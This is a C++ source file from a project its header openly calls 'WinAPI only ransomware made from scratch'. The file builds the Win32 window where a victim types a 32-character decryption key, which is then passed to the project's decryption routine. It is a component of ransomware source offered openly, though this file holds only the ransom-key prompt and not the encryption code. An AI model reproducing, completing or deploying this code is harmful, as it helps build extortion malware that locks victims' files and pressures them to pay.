/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "DecryptionPrompt.h"

const LPCWSTR commonDecryptionKeyErr = L"Please enter a valid decryption key!";
const int validDecryptionKeyLen = 32;

LPCWSTR windowClass = L"primaryWindow"; 
WNDCLASSEX wc;
HWND hwnd;
MSG Msg;

HWND hInputBox, hSubmitButton;

DWORD WINAPI DisplayMessageBox(LPVOID _) {
	MessageBox(NULL, L"Decryption began... Do not turn your computer off!", L"Message", MB_ICONWARNING);
	return 0;
}

int onSubmit(std::wstring rawPrivateKey) {
	HANDLE hThread = CreateThread(NULL, 0, DisplayMessageBox, NULL, 0, NULL);
	if (rawPrivateKey.length() != validDecryptionKeyLen) {
		MessageBox(NULL, commonDecryptionKeyErr, NULL, NULL);
		return 0;
	}

	std::wstring wPrivateKey(&rawPrivateKey[0]); // convert to wstring
	std::string sPrivateKey(wPrivateKey.begin(), wPrivateKey.end()); // and to string

	if (!handleInstallation(sPrivateKey.c_str(), false)) {
		MessageBox(NULL, L"Decryption method failed!", NULL, NULL);
		return 0;
	}

	/*if (!handleDirectory(sPrivateKey.c_str(), L"D:\\Media Libraries\\Desktop\\test\\", FALSE)) { // NEEDS prepending slash
		MessageBox(NULL, L"Decryption method failed!", NULL, NULL);
		return 0;
	}*/

	if (hThread != NULL) CloseHandle(hThread);
	MessageBox(NULL, L"Decryption finished!", L"Message", MB_ICONASTERISK);
	DestroyWindow(hwnd);

	return 1;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_COMMAND:
		if (reinterpret_cast<HWND>(lParam) == hSubmitButton) {
			TCHAR textBuffer[256];
			GetWindowText(hInputBox, textBuffer, 256);
			onSubmit(textBuffer);
		}
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

// this window is absolutely awful, do not judge
void initiateDecryptionPrompt() {
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	//wc.hInstance = hInstance;
	wc.hIcon = LoadIcon(NULL, IDI_SHIELD);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = windowClass;
	wc.hIconSm = LoadIcon(NULL, IDI_SHIELD);

	if (!RegisterClassEx(&wc))
	{
		MessageBox(NULL, L"Window Registration Failed!", L"Error!",
			MB_ICONEXCLAMATION | MB_OK);
		return;
	}

	hwnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		windowClass,
		L"Decryption key prompt",
		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, // WS_MINIMIZEBOX, WS_MAXIMIZEBOX
		CW_USEDEFAULT, CW_USEDEFAULT, 300, 100,
		NULL, NULL, NULL, NULL);

	if (hwnd == NULL)
	{
		MessageBox(NULL, L"Window Creation Failed!", L"Error!",
			MB_ICONEXCLAMATION | MB_OK);
		return;
	}

	hInputBox = CreateWindow(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 10, 10, 200, 25, hwnd, NULL, NULL, NULL);
	hSubmitButton = CreateWindow(L"BUTTON", L"Submit", WS_CHILD | WS_VISIBLE, 210, 10, 60, 25, hwnd, NULL, NULL, NULL);

	// All of this shit just to center a god damn window
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	RECT windowRect;
	GetWindowRect(hwnd, &windowRect);

	int windowWidth = windowRect.right - windowRect.left;
	int windowHeight = windowRect.bottom - windowRect.top;

	int xPos = (screenWidth - windowWidth) / 2;
	int yPos = (screenHeight - windowHeight) / 2;

	// Move the window to the center
	SetWindowPos(hwnd, NULL, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_NOSIZE);

	ShowWindow(hwnd, 1);
	UpdateWindow(hwnd);

	while (GetMessage(&Msg, NULL, 0, 0) > 0) // the loop of hell
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}
